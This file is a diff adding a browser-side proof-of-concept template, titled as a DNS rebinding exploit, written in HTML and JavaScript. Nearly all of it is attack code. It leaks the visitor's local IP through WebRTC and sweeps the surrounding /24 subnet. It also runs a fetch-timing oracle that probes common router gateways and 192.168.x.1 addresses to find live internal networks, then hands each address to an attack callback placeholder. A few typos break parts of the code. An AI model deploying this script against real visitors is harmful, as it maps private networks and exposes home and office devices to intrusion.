@@ -1,0 +1,114 @@
+<HTML><TITLE>DNS Rebinding Exploit PoC</TITLE>
+<DIV ID="RTC">Attempting WebRTC Address Discovery...<BR></DIV><BR>
+<DIV ID=FAINTORACLE></DIV>
+
+<script>
+
+function buildAddr(ipaddr, octet) {
+	var octets = ipaddr.split(".");
+	octets[3] = String(octet);
+	return octets.join(".");
+}
+
+function ip_callback(ipaddr) {
+	%IP_CALLBACK%
+}
+
+var client_ip = "";
+var faint_mode = %FAINTMODE%;
+// Modes:
+// 0 - Never Use FAINT 
+// 1 - Use FAINT if WebRTC fails to find address
+// 2 - Always Use FAINT (even if WebRTC works)
+
+var useFAINT = 0;
+
+function test_subnet(ipaddr) {
+    document.getElementById("RTC").innerHTML = "<P>IP Found: " + ipaddr + "</P>";
+    var Slash24 = Array.apply(null, Array(254)).map(function (_,i) { return buildAddr(ipaddr,i); });
+    for (var index in Slash24)
+        ip_callback(Slash24[index]);
+}
+
+var pc = new window.RTCPeerConnection();
+        pc.onicecandidate = function(ice){
+
+                    if (ice.candidate) {
+                            var cand = ice.candidate.candidate;
+			    var re = /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/;
+                            var ip_match = re.exec(cand);
+                            if (ip_match) {
+                                client_ip = ip_match[0];
+                                test_subnet(client_ip);
+                                var output = document.createElement("DIV");
+                                output.id = "output";
+                                output.innertText = "IP: " + client_ip + "\n";
+				document.body.appendChild(output);
+			    } else {
+				// WebRTC didn't get a hit
+				if (faint_mode==1) FAINT();
+			    }
+                    }
+        }
+
+pc.createDataChannel("");
+pc.createOffer(function(result){
+           //trigger the stun server request
+           pc.setLocalDescription(result, function(){}, function(){});
+}, function(){});
+
+var FAINTORACLE_DIV = document.getElementById("FAINTORACLE");
+
+function FAINT() {
+    FAINTORACLE_DIV.innertHTML = "Fetch API Timing Oracle Results (after 5 seconds)<BR>";
+    active_subnets = [];
+    function network_oracle(ipaddr) {
+	console.log("network_oracle(" + ipaddr + ");");
+        FAINTORACLE_DIV.innerText += "Checking " + ipaddr + "\n";
+        var start_time = Date.now();
+        fetch("http://" + ipaddr,{ mode: 'no-cors' }).then(
+             function(response) {
+		  document.getElementById("FAINTORACLE").innerText += ipaddr + ":80 accepted a connection\n";
+                  console.log(ipaddr + " has port 80 open");
+             }).catch(function(err) {
+                  delta_time = Date.now()-start_time;
+		  if (delta_time<5000) {
+                      active_subnets.push(ipaddr);
+		      document.getElementById("FAINTORACLE").innerText += ipaddr + " is likely an active subnet (" + delta_time/1000 + " seconds to process)\n";
+		  }
+             });
+    }
+    function test_active_subnets() {
+        for (var idx in active_subnets) {
+            var ipaddr = active_subnets[idx];
+            var Slash24 = Array.apply(null, Array(254)).map(function (_,i) { return buildAddr(ipaddr,i); });
+            for (var index in Slash24)
+                ip_callback(Slash24[index]);
+        }
+    }
+
+    var common_gateways = ["192.168.0.1", "192.168.1.1", "192.168.2.1", "10.0.0.1", "172.16.0.1", "172.16.1.1", "10.1.0.0"];
+    var more_gateways = [];
+    var TwoFiftyFour = Array.apply(null, Array(254)).map(function (_,i) { return i; });
+    for (var octet in TwoFiftyFour)
+            more_gateways.push("192.168." + TwoFiftyFour[octet] + ".1");
+    for (var idx in common_gateways) network_oracle(common_gateways[idx]);
+
+    setTimeout(function () {
+            if (active_subnets.legnth == 0) {
+                    for (var idx in more_gateways) network_oracle(more_gateways[idx]);
+                    setTimeout(test_active_subnets(),5000);
+            } else {
+                    test_active_subnets();
+            }
+
+    }, 5000);
+}
+
+// When in autofaint mode, wait a little and then see if WebRTC set a client_ip value 
+if (faint_mode==1)
+    setTimeout(function () { if (client_ip=="") FAINT();},500);
+// If FAINT is explicitly enabled, run it:
+if (faint_mode==2) FAINT();
+</script>
+</HTML>
